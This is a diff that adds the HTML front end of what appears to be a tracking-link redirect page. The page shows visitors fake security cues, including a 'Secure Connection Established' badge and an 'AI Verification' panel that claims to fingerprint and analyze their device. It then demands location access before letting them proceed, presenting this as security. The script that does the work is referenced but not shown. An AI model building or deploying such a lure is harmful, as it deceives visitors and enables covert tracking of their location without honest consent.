@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div id="loading-section">
+            <div class="loader"></div>
+            <h1>Loading Content</h1>
+            <p>Please wait while we verify your access...</p>
+            <div class="security-badge">Secure Connection Established</div>
+            
+            <div class="verification-container hidden" id="verification-container">
+                <h3>AI Verification</h3>
+                <p>Our system is analyzing your device for security purposes</p>
+                
+                <div class="verification-steps">
+                    <div class="verification-step">
+                        <div class="verification-icon pending" id="step-bot">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <circle cx="12" cy="12" r="10"></circle>
+                            </svg>
+                        </div>
+                        <div class="verification-text">Bot Detection</div>
+                    </div>
+                    <div class="verification-step">
+                        <div class="verification-icon pending" id="step-behavior">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <circle cx="12" cy="12" r="10"></circle>
+                            </svg>
+                        </div>
+                        <div class="verification-text">Behavior Analysis</div>
+                    </div>
+                    <div class="verification-step">
+                        <div class="verification-icon pending" id="step-fingerprint">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <circle cx="12" cy="12" r="10"></circle>
+                            </svg>
+                        </div>
+                        <div class="verification-text">Device Fingerprinting</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div id="expired-section" class="hidden">
+            <div class="expiry-notice">
+                <h3>Link Expired</h3>
+                <p>This tracking link has expired and is no longer active.</p>
+            </div>
+        </div>
+        
+        <div id="location-required-section" class="hidden">
+            <div class="location-required">
+                <h3>Location Access Required</h3>
+                <p>To continue, please enable location services. This helps us provide you with a better experience and ensure security.</p>
+            </div>
+            
+            <h1>Enable Location</h1>
+            <p>This content requires location access to proceed. Click the button below to enable location services.</p>
+            
+            <button id="request-location-btn" class="btn btn-block">Enable Location Services</button>
+            <p id="location-error" class="hidden" style="color: var(--danger); margin-top: 1rem;"></p>
+        </div>
+        
+        <div id="redirect-section" class="hidden">
+            <h1>Redirecting to Destination</h1>
+            <p>You're being securely redirected to the requested content.</p>
+            <div class="loader"></div>
+            <p id="custom-message" style="font-style: italic; margin-top: 1rem;"></p>
+        </div>
+    </div>
+
+    <script src="assets/js/redirect.js"></script>
+</body>
+</html>
